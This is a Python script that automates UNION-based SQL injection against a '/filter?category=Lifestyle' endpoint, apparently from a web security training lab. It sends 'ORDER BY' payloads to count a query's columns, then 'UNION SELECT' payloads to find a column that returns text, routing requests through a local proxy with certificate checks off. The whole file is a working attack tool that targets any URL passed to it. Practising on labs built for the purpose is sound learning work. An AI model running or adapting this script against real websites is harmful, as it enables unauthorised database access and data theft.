import requests
import urllib3
import sys

urllib3.disable_warnings()

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli(url):
    path = '/filter?category=Lifestyle'
    for i in range(1, 50):
        sqli_payload = "' ORDER BY {}--".format(i)
        response = requests.get(url + path + sqli_payload,
                                verify=False, proxies=proxies)
        if 'Internal Server Error' in response.text:
            return i - 1

    return False


def exploit_sqli_string_type(url, num_col):
    path = '/filter?category=Lifestyle'
    for i in range(1, num_col + 1):
        str = "'abc'"
        payload_list = ['NULL'] * num_col
        payload_list[i - 1] = str
        sqli_payload = "' UNION SELECT " + ','.join(payload_list) + '--'
        response = requests.get(url + path + sqli_payload,
                                verify=False, proxies=proxies)
        if str.strip('\'') in response.text:
            return i
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)

    print('[+] Figuring out number of columns...')
    num_col = exploit_sqli(url)
    if num_col:
        print('[+] The number of columns is {}.'.format(num_col))
        print('[+] Figuring out column type...')
        string_column = exploit_sqli_string_type(url, num_col)

        if string_column:
            print('[+] The column that contains text is {}.'.format(string_column))
        else:
            print('[-] We were not able to find column that has a string data type')
    else:
        print('[-] SQL Injection is unsuccessful.')
